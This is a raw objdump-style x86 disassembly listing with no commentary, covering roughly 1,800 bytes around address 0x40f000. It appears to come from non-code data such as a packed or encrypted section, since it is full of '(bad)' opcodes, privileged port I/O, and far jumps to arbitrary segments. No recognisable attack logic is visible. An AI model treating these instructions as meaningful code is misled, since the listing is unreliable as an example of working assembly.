  40eb98:	test   BYTE PTR [ebx],bl
  40eb9a:	dec    ebp
  40eb9b:	(bad)
  40eb9f:	mov    al,ds:0x1a58f5f4
  40eba4:	das    
  40eba5:	cmc    
  40eba6:	cwde   
  40eba7:	add    esp,ebx
  40eba9:	int3   
  40ebaa:	(bad)  
  40ebab:	in     eax,0x6c
  40ebad:	pop    ds
  40ebae:	ror    eax,0xb9
  40ebb1:	std    
  40ebb2:	mov    esi,0xe725a354
  40ebb7:	cmp    DWORD PTR [ebx+0x25ae0df3],0x5b
  40ebbe:	lahf   
  40ebbf:	jae    0x40eb4f
  40ebc1:	mov    WORD PTR [ecx+eax*2-0x64],fs
  40ebc5:	push   esi
  40ebc6:	mov    bl,0xbd
  40ebc8:	fistp  WORD PTR [edx+0x7d6874be]
  40ebce:	out    0x9b,eax
  40ebd0:	xlat   BYTE PTR ds:[ebx]
  40ebd1:	cmp    ecx,eax
  40ebd3:	cs ins BYTE PTR es:[edi],dx
  40ebd5:	in     eax,dx
  40ebd6:	lods   eax,DWORD PTR ds:[esi]
  40ebd7:	std    
  40ebd8:	inc    eax
  40ebd9:	sbb    al,0x67
  40ebdb:	add    eax,0xc0be0de
  40ebe0:	loop   0x40ebfe
  40ebe2:	push   ecx
  40ebe3:	dec    edx
  40ebe4:	adc    esp,edx
  40ebe6:	fisubr DWORD PTR [esi+0x5b]
  40ebe9:	daa    
  40ebea:	inc    ebx
  40ebeb:	repnz push ecx
  40ebed:	(bad)  
  40ebee:	out    0xac,al
  40ebf0:	cs aad 0x91
  40ebf3:	sbb    DWORD PTR gs:[ebx],ebx
  40ebf6:	xchg   ebx,eax
  40ebf7:	dec    edi
  40ebf8:	in     al,0xb2
  40ebfa:	dec    eax
  40ebfb:	and    ecx,DWORD PTR [esi]
  40ebfd:	inc    eax
  40ebfe:	pushf  
  40ebff:	mov    eax,0xf52dc7c7
  40ec04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec05:	sti    
  40ec06:	pop    ebx
  40ec07:	inc    edx
  40ec08:	dec    eax
  40ec09:	stos   DWORD PTR es:[edi],eax
  40ec0a:	sbb    edx,0xf02e5c95
  40ec10:	pop    edx
  40ec11:	lea    edx,[esi]
  40ec13:	pop    eax
  40ec14:	jnp    0x40ec26
  40ec16:	push   esp
  40ec17:	mov    esi,0x4a4370a
  40ec1c:	adc    DWORD PTR ds:0x9ba91993,ebp
  40ec22:	jae    0x40ec4b
  40ec24:	loopne 0x40ec13
  40ec26:	rol    BYTE PTR [esi],0x8a
  40ec29:	(bad)  
  40ec2a:	jge    0x40ec18
  40ec2c:	rcr    BYTE PTR [esi],0x3
  40ec2f:	add    edx,0x69
  40ec32:	repnz mov bh,BYTE PTR ds:0xd2f6c431
  40ec39:	test   BYTE PTR [ecx-0x75],ch
  40ec3c:	(bad)  
  40ec3d:	adc    bl,BYTE PTR [ebp-0x17]
  40ec40:	call   0x9dbefb3a
  40ec45:	adc    al,0xeb
  40ec47:	fwait
  40ec48:	sbb    dl,BYTE PTR [eax+edi*4-0x201c943b]
  40ec4f:	scas   al,BYTE PTR es:[edi]
  40ec50:	mov    al,ds:0x8299f046
  40ec55:	pop    DWORD PTR [edx]
  40ec57:	out    dx,al
  40ec58:	call   esp
  40ec5a:	or     BYTE PTR [eax],0x2
  40ec5d:	mov    edi,0xa3a39a32
  40ec62:	ja     0x40ebec
  40ec64:	cdq    
  40ec65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec66:	fcom   DWORD PTR [edi+0x6367c175]
  40ec6c:	out    0xe4,eax
  40ec6e:	cld    
  40ec6f:	or     DWORD PTR [ebp+ebx*2+0x43],0xe48095c3
  40ec77:	jb     0x40ecd6
  40ec79:	addr16 pop es
  40ec7b:	inc    BYTE PTR ds:0x305f224b
  40ec81:	loop   0x40ec5d
  40ec83:	sar    DWORD PTR [edi-0x34],1
  40ec86:	adc    dh,BYTE PTR [edi]
  40ec88:	call   0xcea8:0x5c424822
  40ec8f:	cmp    eax,0xb1922359
  40ec94:	and    edx,DWORD PTR [ecx-0x25]
  40ec97:	jbe    0x40ec2f
  40ec99:	ss hlt 
  40ec9b:	mov    WORD PTR [edi+0x4d47ab09],?
  40eca1:	test   BYTE PTR [edx],0x7d
  40eca4:	(bad)  
  40eca5:	and    cl,dh
  40eca7:	sbb    edx,DWORD PTR [esi]
  40eca9:	fdivr  QWORD PTR [esi+0x3e]
  40ecac:	jb     0x40ec80
  40ecae:	jae    0x40ec5b
  40ecb0:	test   DWORD PTR [ecx-0x3604fc99],edi
  40ecb6:	lds    ecx,FWORD PTR ss:[ebx-0x19821281]
  40ecbd:	jno    0x40ecd7
  40ecbf:	imul   ecx,DWORD PTR [edi-0x466fad6b],0x70
  40ecc6:	loope  0x40ecf7
  40ecc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecc9:	dec    edi
  40ecca:	mov    ah,0x19
  40eccc:	mov    dl,0x65
  40ecce:	popa   
  40eccf:	out    0x4a,eax
  40ecd1:	jge    0x40ec71
  40ecd3:	retf   0x421b
  40ecd6:	ds push edx
  40ecd8:	sti    
  40ecd9:	(bad)  
  40ecda:	stc    
  40ecdb:	aam    0x19
  40ecdd:	popf   
  40ecde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecdf:	stc    
  40ece0:	inc    eax
  40ece1:	mov    ch,0x5d
  40ece3:	pop    esi
  40ece4:	cmp    DWORD PTR [edx],ecx
  40ece6:	icebp  
  40ece7:	dec    edx
  40ece8:	arpl   WORD PTR [esi+ebx*4+0x37eacc15],si
  40ecef:	xlat   BYTE PTR ds:[ebx]
  40ecf0:	cwde   
  40ecf1:	jmp    0x8a9d:0x896ff88d
  40ecf8:	in     al,0xc7
  40ecfa:	pusha  
  40ecfb:	bnd jno 0x40ed09
  40ecfe:	shr    BYTE PTR [ecx-0x3b],cl
  40ed01:	outs   dx,DWORD PTR ds:[esi]
  40ed02:	adc    cl,al
  40ed04:	es test eax,0xf508ca05
  40ed0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed0b:	fdivr  st,st(5)
  40ed0d:	sbb    ebx,DWORD PTR [esi]
  40ed0f:	dec    edx
  40ed10:	or     bh,BYTE PTR [eax]
  40ed12:	out    dx,al
  40ed13:	pop    eax
  40ed14:	sub    eax,0xb508b9b2
  40ed19:	cmp    al,dh
  40ed1b:	shl    BYTE PTR [ebp-0x7d],1
  40ed1e:	cwde   
  40ed1f:	lea    ebp,ss:[ebx]
  40ed22:	xchg   esp,eax
  40ed23:	mov    ch,0xd
  40ed25:	nop
  40ed26:	sti    
  40ed27:	fcmovb st,st(0)
  40ed29:	imul   edi,DWORD PTR [ebp+0x12bec3fa],0x541252af
  40ed33:	jmp    0xd17d:0x4b2c5dc2
  40ed3a:	jae    0x40edb4
  40ed3c:	mov    ebp,0x4a4dc0a5
  40ed41:	pop    es
  40ed42:	ins    DWORD PTR es:[edi],dx
  40ed43:	mov    dh,BYTE PTR [eax-0x2c]
  40ed46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed47:	mov    ecx,0xddecf4cd
  40ed4c:	iret   
  40ed4d:	mov    esi,0x9f4d65e2
  40ed52:	xor    eax,0xeab2d490
  40ed57:	scas   al,BYTE PTR es:[edi]
  40ed58:	cmp    eax,0xd73c59a5
  40ed5d:	clc    
  40ed5e:	clc    
  40ed5f:	mov    ebp,0xec5270de
  40ed64:	in     eax,dx
  40ed65:	inc    edx
  40ed66:	mov    edi,0xc7e9880e
  40ed6b:	dec    edi
  40ed6c:	jmp    0x40ed57
  40ed6e:	ss cmp eax,0xa1e5fc82
  40ed74:	pop    ds
  40ed75:	loop   0x40ed26
  40ed77:	and    BYTE PTR [eax],ah
  40ed79:	repnz mov esi,DWORD PTR [edx-0x74c0a3a2]
  40ed80:	shl    dh,1
  40ed82:	arpl   WORD PTR [eax-0xa1cf278],bp
  40ed88:	sbb    BYTE PTR [eax+0x4e],0xe2
  40ed8c:	icebp  
  40ed8d:	pop    es
  40ed8e:	jbe    0x40ed7e
  40ed90:	cmp    eax,0x71c9e6b9
  40ed95:	xchg   ecx,eax
  40ed96:	adc    al,0xcf
  40ed98:	daa    
  40ed99:	retf   
  40ed9a:	push   ebp
  40ed9b:	ja     0x40ed6c
  40ed9d:	cmc    
  40ed9e:	(bad)  
  40ed9f:	jmp    0x62d0:0x73bfb79c
  40eda6:	xchg   ecx,eax
  40eda7:	xchg   edi,eax
  40eda8:	bnd jno 0x40ed3f
  40edab:	lods   eax,DWORD PTR ds:[esi]
  40edac:	inc    ecx
  40edad:	jnp    0x40edb1
  40edaf:	fisttp QWORD PTR [eax]
  40edb1:	ret    0x4aad
  40edb4:	int    0x9e
  40edb6:	sbb    ebp,DWORD PTR [edx+0xf02fa80]
  40edbc:	cli    
  40edbd:	pop    ebp
  40edbe:	mov    BYTE PTR [ebx+0x3f],cl
  40edc1:	mov    edx,0x1c0e24bb
  40edc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edc7:	or     BYTE PTR [ecx-0x49cfa394],ch
  40edcd:	xchg   ebp,eax
  40edce:	adc    DWORD PTR [edi+0xb],ebp
  40edd1:	dec    esp
  40edd2:	mov    ebp,0x99be1b1d
  40edd7:	popa   
  40edd8:	adc    DWORD PTR [ebx+0x22],edx
  40eddb:	ja     0x40ed93
  40eddd:	and    BYTE PTR [esi+0x70],bh
  40ede0:	inc    edx
  40ede1:	int    0x64
  40ede3:	test   BYTE PTR [esi+0x3bf437a4],bh
  40ede9:	adc    al,0x1c
  40edeb:	sub    esi,esp
  40eded:	into   
  40edee:	jp     0x40ee04
  40edf0:	sbb    eax,0xab7eef27
  40edf5:	dec    edi
  40edf6:	or     al,BYTE PTR [esi]
  40edf8:	jmp    0x941f:0xf5e05661
  40edff:	pop    edx
  40ee00:	or     BYTE PTR [ecx+0x3f5812d8],dh
  40ee06:	xor    dh,dh
  40ee08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee09:	xchg   ebx,eax
  40ee0a:	leave  
  40ee0b:	sbb    DWORD PTR [edx],edi
  40ee0d:	outs   dx,BYTE PTR ds:[esi]
  40ee0e:	pop    eax
  40ee0f:	push   esi
  40ee10:	hlt    
  40ee11:	cli    
  40ee12:	loopne 0x40edbe
  40ee14:	jb     0x40ee8b
  40ee16:	mov    edx,0xf5d0919d
  40ee1b:	(bad)  
  40ee1c:	outs   dx,DWORD PTR ds:[esi]
  40ee1d:	xchg   DWORD PTR gs:[ecx],ecx
  40ee20:	jmp    0x3f239f2b
  40ee25:	lahf   
  40ee26:	dec    edx
  40ee27:	pop    edx
  40ee28:	aad    0xbc
  40ee2a:	dec    edi
  40ee2b:	cld    
  40ee2c:	cdq    
  40ee2d:	mov    cs,WORD PTR [ebx]
  40ee2f:	enter  0x111,0xbe
  40ee33:	push   ebx
  40ee34:	ja     0x40ee2e
  40ee36:	(bad)  
  40ee37:	pushf  
  40ee38:	fdivr  QWORD PTR [eax]
  40ee3a:	xlat   BYTE PTR ds:[ebx]
  40ee3b:	cld    
  40ee3c:	jmp    0x40eeba
  40ee3e:	ins    DWORD PTR es:[edi],dx
  40ee3f:	jmp    0x14b4:0x310afa95
  40ee46:	inc    edx
  40ee47:	call   0x71db:0x2db8706d
  40ee4e:	imul   edi,esp,0x5e
  40ee51:	mov    bh,0xbb
  40ee53:	lods   eax,DWORD PTR ds:[esi]
  40ee54:	cwde   
  40ee55:	(bad)  
  40ee56:	jns    0x40ee12
  40ee58:	repz pop edi
  40ee5a:	push   ds
  40ee5b:	(bad)  
  40ee5c:	clc    
  40ee5d:	add    al,0xce
  40ee5f:	mov    esp,0x126b9226
  40ee64:	mov    al,0x6
  40ee66:	sbb    ebx,DWORD PTR [ebp+0x5e0b4d58]
  40ee6c:	mov    ch,0xce
  40ee6e:	xchg   ecx,eax
  40ee6f:	daa    
  40ee70:	inc    eax
  40ee71:	(bad)  
  40ee72:	mov    al,ah
  40ee74:	lods   eax,DWORD PTR ds:[esi]
  40ee75:	sbb    cl,BYTE PTR [eax]
  40ee77:	adc    eax,0x952c369d
  40ee7c:	push   cs
  40ee7d:	jl     0x40ee22
  40ee7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee80:	cli    
  40ee81:	fsubr  st(0),st
  40ee83:	pop    ecx
  40ee84:	sub    DWORD PTR [ebp+0x1475184b],0x968d8693
  40ee8e:	mov    DWORD PTR [esi+0x2f15af92],esi
  40ee94:	sbb    al,0xea
  40ee96:	stos   DWORD PTR es:[edi],eax
  40ee97:	sbb    al,0x7f
  40ee99:	dec    edx
  40ee9a:	mov    DWORD PTR [eax+0x2],0xab1d5ba4
  40eea1:	lock mov ebp,0xf986a4ad
  40eea7:	pop    edi
  40eea8:	xchg   ebx,eax
  40eea9:	push   ecx
  40eeaa:	fmul   QWORD PTR ss:[edi+0x4bc7c4d6]
  40eeb1:	inc    ebp
  40eeb2:	xchg   edi,eax
  40eeb3:	jno    0x40ef29
  40eeb5:	les    ebp,FWORD PTR [esi-0x22]
  40eeb8:	xchg   eax,edi
  40eeba:	hlt    
  40eebb:	xor    DWORD PTR [esi],edx
  40eebd:	mov    dl,0xd3
  40eebf:	sahf   
  40eec0:	out    dx,eax
  40eec1:	loop   0x40ee67
  40eec3:	mov    bl,0x82
  40eec5:	cdq    
  40eec6:	or     DWORD PTR [ebx-0x1f],ebp
  40eec9:	lock and eax,0xf3591da8
  40eecf:	in     eax,0x5f
  40eed1:	pop    edx
  40eed2:	jne    0x40eeb1
  40eed4:	sbb    bh,BYTE PTR [edx]
  40eed6:	jl     0x40eeb8
  40eed8:	cs push ds
  40eeda:	ins    BYTE PTR es:[edi],dx
  40eedb:	repnz cmp eax,0xb9ee1c1
  40eee1:	fist   WORD PTR [ebx+0x77]
  40eee4:	xlat   BYTE PTR ds:[ebx]
  40eee5:	fldcw  WORD PTR [ebx+0x1059e99d]
  40eeeb:	pop    edi
  40eeec:	out    dx,eax
  40eeed:	ficomp DWORD PTR [edx]
  40eeef:	push   es
  40eef0:	jne    0x40eed1
  40eef2:	fiadd  WORD PTR [edi-0x78]
  40eef5:	and    DWORD PTR [esi],0xffffffc9
  40eef8:	je     0x40ef1d
  40eefa:	pop    DWORD PTR [ebp-0x25]
  40eefd:	xlat   BYTE PTR ds:[ebx]
  40eefe:	popf   
  40eeff:	test   DWORD PTR [ebx+0x55],edi
  40ef02:	cli    
  40ef03:	mov    esi,0xfaa88df
  40ef08:	or     eax,0xb16081ee
  40ef0d:	fsubrp st(5),st
  40ef0f:	cmp    esp,DWORD PTR [ebx-0x735a549b]
  40ef15:	mov    cl,0x10
  40ef17:	mov    WORD PTR [edx+0x59f93656],ss
  40ef1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef1e:	mov    edx,0xd8ffe4a0
  40ef23:	cdq    
  40ef24:	add    al,0xc5
  40ef26:	aas    
  40ef27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef28:	(bad)  
  40ef29:	(bad)  
  40ef2a:	and    al,0x58
  40ef2c:	lock shl BYTE PTR [edi+0x5d],1
  40ef30:	xor    BYTE PTR [ebx],dh
  40ef32:	or     edi,DWORD PTR [eax-0x615460a8]
  40ef38:	xlat   BYTE PTR ds:[ebx]
  40ef39:	pop    ebp
  40ef3a:	rcl    dl,1
  40ef3c:	mov    ch,0x6c
  40ef3e:	dec    esp
  40ef3f:	cdq    
  40ef40:	sbb    eax,0x7109604b
  40ef45:	or     eax,0xa188ac96
  40ef4a:	retf   
  40ef4b:	jnp    0x40efa6
  40ef4d:	mov    cl,0xd4
  40ef4f:	sub    eax,0xa6da4185
  40ef54:	inc    ecx
  40ef55:	inc    esi
  40ef56:	add    al,0x6c
  40ef58:	xlat   BYTE PTR ds:[ebx]
  40ef59:	xor    eax,0xf3f75a76
  40ef5e:	and    bl,BYTE PTR [eax]
  40ef60:	sbb    BYTE PTR [ecx-0x572fee9c],0x3d
  40ef67:	fbld   TBYTE PTR [esi+0x10]
  40ef6a:	xchg   edi,eax
  40ef6b:	icebp  
  40ef6c:	daa    
  40ef6d:	mov    cl,0x1d
  40ef6f:	cmp    ch,BYTE PTR [eax-0x2]
  40ef72:	je     0x40ef0c
  40ef74:	mov    bh,BYTE PTR [eax+0xcc67948]
  40ef7a:	clc    
  40ef7b:	jno    0x40efd6
  40ef7d:	add    dl,BYTE PTR [esi+ebx*2+0x6e]
  40ef81:	popa   
  40ef82:	xchg   edx,eax
  40ef83:	dec    ebx
  40ef84:	adc    cl,BYTE PTR [eax-0x4a345769]
  40ef8a:	inc    ebp
  40ef8b:	(bad)  
  40ef8d:	ds xchg esp,eax
  40ef8f:	mov    ds:0xfd1afc61,al
  40ef94:	mov    esi,0x2944ed95
  40ef99:	mov    edx,0x11d71189
  40ef9e:	sti    
  40ef9f:	xchg   ecx,eax
  40efa0:	dec    eax
  40efa1:	iret   
  40efa2:	stos   DWORD PTR es:[edi],eax
  40efa3:	inc    esi
  40efa4:	jmp    0x40ef6c
  40efa6:	push   ebx
  40efa7:	and    eax,0x87903c11
  40efac:	mov    eax,0x75e0cc3d
  40efb1:	popf   
  40efb2:	cmc    
  40efb3:	inc    ebx
  40efb4:	ds pop ebx
  40efb6:	inc    edi
  40efb7:	jae    0x40efe8
  40efb9:	(bad)  [eax-0x4593da6b]
  40efbf:	xor    DWORD PTR [esi+0xd],esp
  40efc2:	and    eax,esp
  40efc4:	cld    
  40efc5:	out    0xc5,eax
  40efc7:	xor    cl,dl
  40efc9:	adc    al,0x7d
  40efcb:	mov    ebx,0x33d7ca8a
  40efd0:	mov    ds:0xe5c983f3,al
  40efd5:	adc    DWORD PTR [eax-0x712321e4],esi
  40efdb:	adc    eax,0x6103d0e4
  40efe0:	clc    
  40efe1:	add    bh,dl
  40efe3:	mov    ds:0x691f650d,eax
  40efe8:	mov    DWORD PTR [esi+0x64],edx
  40efeb:	bound  edi,QWORD PTR [edi]
  40efed:	rcl    DWORD PTR [eax-0x1fd03749],0x49
  40eff4:	sbb    al,0xfc
  40eff6:	mov    esi,0xd401ec94
  40effb:	std    
  40effc:	ja     0x40f025
  40effe:	lock pop edx
  40f000:	das    
  40f001:	pop    esi
  40f002:	dec    ecx
  40f003:	or     esi,DWORD PTR ds:0x9d3fb8c8
  40f009:	add    al,0xb5
  40f00b:	arpl   WORD PTR [esi],bp
  40f00d:	sbb    BYTE PTR [esi+0x4445d832],0xda
  40f014:	sbb    dl,ch
  40f016:	xor    eax,0x8fd99581
  40f01b:	mov    dl,0x9a
  40f01d:	rcl    DWORD PTR [esi],cl
  40f01f:	out    dx,al
  40f020:	aam    0x53
  40f022:	ret    0xf8b
  40f025:	(bad)  
  40f026:	fdiv   QWORD PTR [ebx]
  40f028:	call   0xb0ca6be7
  40f02d:	outs   dx,DWORD PTR ds:[esi]
  40f02e:	retf   
  40f02f:	add    al,0x49
  40f031:	mov    esp,0x4974bc6c
  40f036:	(bad)  
  40f037:	jp     0x40f01a
  40f039:	mov    ebp,0x966ce22e
  40f03e:	push   esp
  40f03f:	iret   
  40f040:	ret    
  40f041:	xor    bl,al
  40f043:	push   ecx
  40f044:	adc    BYTE PTR [ebx-0x44496302],0x39
  40f04b:	jge    0x40f0c9
  40f04d:	or     BYTE PTR ds:0xbb494c22,bh
  40f053:	dec    ebp
  40f054:	adc    DWORD PTR [edi-0x238ffbdd],ecx
  40f05a:	pop    DWORD PTR ds:0x275228b3
  40f060:	inc    edi
  40f061:	mov    edi,esi
  40f063:	nop
  40f064:	or     ch,bh
  40f066:	xor    esi,DWORD PTR [ebp-0x25d4f97b]
  40f06c:	pop    ebp
  40f06d:	dec    eax
  40f06e:	in     al,0x9
  40f070:	xchg   ebp,eax
  40f071:	out    0x6f,eax
  40f073:	aas    
  40f074:	mov    DWORD PTR [ecx-0x2],ebp
  40f077:	jmp    FWORD PTR [edi-0x2bb7722a]
  40f07d:	inc    eax
  40f07e:	clc    
  40f07f:	cmp    BYTE PTR [esi+0x31],0x46
  40f083:	ins    BYTE PTR es:[edi],dx
  40f084:	jno    0x40f04d
  40f086:	inc    ecx
  40f087:	push   ebp
  40f088:	add    ah,BYTE PTR [edi]
  40f08a:	dec    ebp
  40f08b:	push   es
  40f08c:	in     al,0x11
  40f08e:	jle    0x40f077
  40f090:	push   0xffffff9e
  40f092:	jb     0x40f05e
  40f094:	cdq    
  40f095:	jg     0x40f055
  40f097:	jns    0x40f0a8
  40f099:	dec    ebx
  40f09a:	adc    ah,BYTE PTR [eax-0x193f5268]
  40f0a0:	into   
  40f0a1:	or     eax,0x7308434
  40f0a6:	dec    edi
  40f0a7:	or     BYTE PTR [ecx-0x6ce21e6b],0xd7
  40f0ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0af:	sub    esi,0x6dfbf377
  40f0b5:	mov    ebx,0xa1efd059
  40f0ba:	int3   
  40f0bb:	div    BYTE PTR [edi-0x20]
  40f0be:	jo     0x40f133
  40f0c0:	cmp    al,0xd8
  40f0c2:	jnp    0x40f09c
  40f0c4:	fst    st(2)
  40f0c6:	xchg   esp,eax
  40f0c7:	dec    ebp
  40f0c8:	imul   ecx,DWORD PTR [edi-0x7d],0xffffff92
  40f0cc:	sbb    dh,bh
  40f0ce:	imul   esp,DWORD PTR [ecx-0x72],0x9a654a54
  40f0d5:	pop    edx
  40f0d6:	repnz lods al,BYTE PTR ds:[esi]
  40f0d8:	sub    edi,ecx
  40f0da:	jbe    0x40f0a4
  40f0dc:	outs   dx,DWORD PTR ds:[esi]
  40f0dd:	lock shr DWORD PTR [esi+edx*1-0x7e018a0a],1
  40f0e5:	(bad)  [eax]
  40f0e7:	in     eax,0xb3
  40f0e9:	lahf   
  40f0ea:	sub    eax,0x9909808
  40f0ef:	add    ah,0x88
  40f0f2:	xor    esp,DWORD PTR [esi]
  40f0f4:	xchg   edx,eax
  40f0f5:	scas   al,BYTE PTR es:[edi]
  40f0f6:	push   esi
  40f0f7:	out    dx,al
  40f0f8:	lods   eax,DWORD PTR ds:[esi]
  40f0f9:	mov    ebx,0xbfbedf0c
  40f0fe:	imul   ebp,DWORD PTR [edx-0x6b094f71],0x93cbe183
  40f108:	mov    ds:0x118eeb2f,eax
  40f10d:	ds push esp
  40f10f:	jns    0x40f187
  40f111:	jb     0x40f120
  40f113:	xchg   ecx,eax
  40f114:	adc    BYTE PTR [ebp-0x547eda2e],0x6e
  40f11b:	pop    edx
  40f11c:	(bad)  
  40f11d:	out    dx,al
  40f11e:	sub    bh,BYTE PTR [eax]
  40f120:	leave  
  40f121:	mov    BYTE PTR [esi],0x8d
  40f124:	add    al,0xf3
  40f126:	mov    DWORD PTR [ecx],eax
  40f128:	shr    bh,cl
  40f12a:	push   eax
  40f12b:	cmp    BYTE PTR [ecx],ch
  40f12d:	or     al,0xaf
  40f12f:	in     eax,dx
  40f130:	js     0x40f10e
  40f132:	(bad)  
  40f133:	mov    cl,0xc8
  40f135:	adc    al,0x16
  40f137:	in     al,dx
  40f138:	out    dx,eax
  40f139:	and    bh,BYTE PTR [esp+ebx*8+0xd5027a3]
  40f140:	cmp    dh,0x7e
  40f143:	mov    edi,0x44121a4e
  40f148:	xor    dl,BYTE PTR [eax+ebx*4-0x15]
  40f14c:	cmp    ebx,eax
  40f14e:	in     al,dx
  40f14f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f150:	xchg   ecx,eax
  40f151:	hlt    
  40f152:	xor    eax,0x63e65cca
  40f157:	scas   al,BYTE PTR es:[edi]
  40f158:	lods   eax,DWORD PTR ds:[esi]
  40f159:	clc    
  40f15a:	hlt    
  40f15b:	jmp    0xe1e:0x4d7b8da8
  40f162:	add    al,BYTE PTR [ebp+0x7]
  40f165:	aas    
  40f166:	add    bl,BYTE PTR [ecx]
  40f168:	mov    DWORD PTR [ebx+0x66],eax
  40f16b:	jae    0x40f160
  40f16d:	pop    edi
  40f16e:	add    ebp,DWORD PTR [esi]
  40f170:	mov    esp,0x17d95bae
  40f175:	data16 fld st(7)
  40f178:	and    BYTE PTR [edx],dh
  40f17a:	neg    ah
  40f17c:	dec    eax
  40f17d:	inc    esi
  40f17e:	or     eax,0x53460133
  40f183:	mov    edi,DWORD PTR [esi]
  40f185:	xor    BYTE PTR [eax],bh
  40f187:	mov    ch,0x7b
  40f189:	push   esp
  40f18a:	or     DWORD PTR [esi],0x8baca9a3
  40f190:	pop    ebx
  40f191:	fild   DWORD PTR ds:0xee8d48e
  40f197:	aaa    
  40f198:	add    ebx,DWORD PTR [edi]
  40f19a:	aam    0x6b
  40f19c:	push   0x9c255bec
  40f1a1:	int3   
  40f1a2:	xor    al,0xcb
  40f1a4:	jbe    0x40f1bf
  40f1a6:	adc    bl,ch
  40f1a8:	and    esi,eax
  40f1aa:	add    DWORD PTR [ecx+0x4e26dee2],ebp
  40f1b0:	mov    dl,0x1c
  40f1b2:	loope  0x40f1c9
  40f1b4:	cld    
  40f1b5:	cli    
  40f1b6:	cmc    
  40f1b7:	outs   dx,DWORD PTR ds:[esi]
  40f1b8:	imul   ecx,esp,0xef430cf4
  40f1be:	push   esp
  40f1bf:	sub    esp,DWORD PTR [ebx-0x1d]
  40f1c2:	jmp    0xc9cc8dfc
  40f1c7:	dec    BYTE PTR [edx+0x288428fd]
  40f1cd:	jl     0x40f175
  40f1cf:	add    dh,ah
  40f1d1:	push   cs
  40f1d2:	inc    ecx
  40f1d3:	jo     0x40f1fc
  40f1d5:	aas    
  40f1d6:	je     0x40f243
  40f1d8:	in     eax,dx
  40f1d9:	sbb    ah,ch
  40f1db:	or     eax,0xc4478a4c
  40f1e1:	inc    ebx
  40f1e2:	dec    edx
  40f1e3:	loope  0x40f1d1
  40f1e5:	ss enter 0xa51c,0x53
  40f1ea:	pop    eax
  40f1eb:	hlt    
  40f1ec:	dec    ebp
  40f1ed:	call   0x949d:0xd7afeee9
  40f1f4:	(bad)  
  40f1f5:	out    dx,eax
  40f1f6:	fcom   st(1)
  40f1f8:	stos   BYTE PTR es:[edi],al
  40f1f9:	mov    cl,0x58
  40f1fb:	mov    edx,DWORD PTR [edi]
  40f1fd:	xchg   esp,edi
  40f1ff:	inc    eax
  40f200:	loope  0x40f256
  40f202:	mov    dl,0xd8
  40f204:	hlt    
  40f205:	test   eax,0xfbbd1a9a
  40f20a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f20b:	push   ss
  40f20c:	xor    al,al
  40f20e:	dec    edi
  40f20f:	ret    
  40f210:	or     ecx,DWORD PTR [ebp-0x1c]
  40f213:	jbe    0x40f20b
  40f215:	dec    ecx
  40f216:	clc    
  40f217:	adc    edx,DWORD PTR [ebp-0x2f5c0479]
  40f21d:	test   BYTE PTR [eax],bl
  40f21f:	dec    edi
  40f220:	(bad)  
  40f221:	std    
  40f222:	ret    
  40f223:	dec    eax
  40f224:	dec    DWORD PTR ds:0x4f09258f
  40f22a:	inc    eax
  40f22b:	mov    al,0x50
  40f22d:	js     0x40f216
  40f22f:	mov    BYTE PTR [eax-0x21ef2c68],ah
  40f235:	or     al,0xac
  40f237:	shl    BYTE PTR [esi+0x41],cl
  40f23a:	jmp    0xf750:0x16c8051d
  40f241:	mov    bl,0xb5
  40f243:	pushf  
  40f244:	fnsave [esi+0x47877d2a]
  40f24a:	push   ecx
  40f24b:	adc    DWORD PTR [ebp-0x6e],0x48013843
  40f252:	cli    
  40f253:	aad    0x79
  40f255:	ja     0x40f1ef
  40f257:	mov    ch,0xdb
  40f259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f25a:	imul   ebx,DWORD PTR [edx-0x1a86a521],0xc76570d6
  40f264:	push   eax
  40f265:	xor    ch,dl
  40f267:	jl     0x40f2af
  40f269:	ror    BYTE PTR [ebx],0x2
  40f26c:	popf   
  40f26d:	jne    0x40f224
  40f26f:	sbb    ah,BYTE PTR [edx-0x35f9af4c]
  40f275:	out    0x6b,al
  40f277:	mov    edi,0x9707c03d
  40f27c:	xchg   ecx,eax
  40f27d:	cmp    ah,dh
  40f27f:	adc    al,0x35
  40f281:	and    eax,0xa76cc47f
  40f286:	jge    0x40f275
  40f288:	inc    ebx
  40f289:	sub    DWORD PTR [ebp*4+0x1d52a3e5],esp
  40f290:	(bad)  
  40f291:	scas   eax,DWORD PTR es:[edi]
  40f292:	xchg   esp,eax
  40f293:	sbb    ebx,DWORD PTR [esp+edi*2-0x3b]
  40f297:	cs pop edx
  40f299:	mov    ss,edi
  40f29b:	in     al,dx
  40f29c:	add    al,BYTE PTR [eax+0x78]
  40f29f:	add    DWORD PTR [esp+ebx*2+0x2a],0x6afd1a4a
  40f2a7:	(bad)  
  40f2a8:	imul   esi,DWORD PTR ds:0xd85f6d7b,0x61
  40f2af:	sahf   
  40f2b0:	mov    esp,esp
  40f2b2:	outs   dx,DWORD PTR ds:[esi]
  40f2b3:	scas   al,BYTE PTR es:[edi]
  40f2b4:	dec    eax
  40f2b5:	loopne 0x40f2a0
  40f2b7:	sti    
  40f2b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b9:	aaa    
  40f2ba:	fmul   QWORD PTR ds:0x8a4a90f6
  40f2c0:	(bad)  
  40f2c1:	fimul  DWORD PTR [edi+ecx*2-0x12327523]
  40f2c8:	js     0x40f2e3
  40f2ca:	or     DWORD PTR [ebx+0x3cb695ad],esi
  40f2d0:	ins    DWORD PTR es:[edi],dx
  40f2d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d2:	inc    esi
  40f2d3:	call   0xfcff:0xeefd1325
  40f2da:	test   ecx,eax
  40f2dc:	inc    ebp
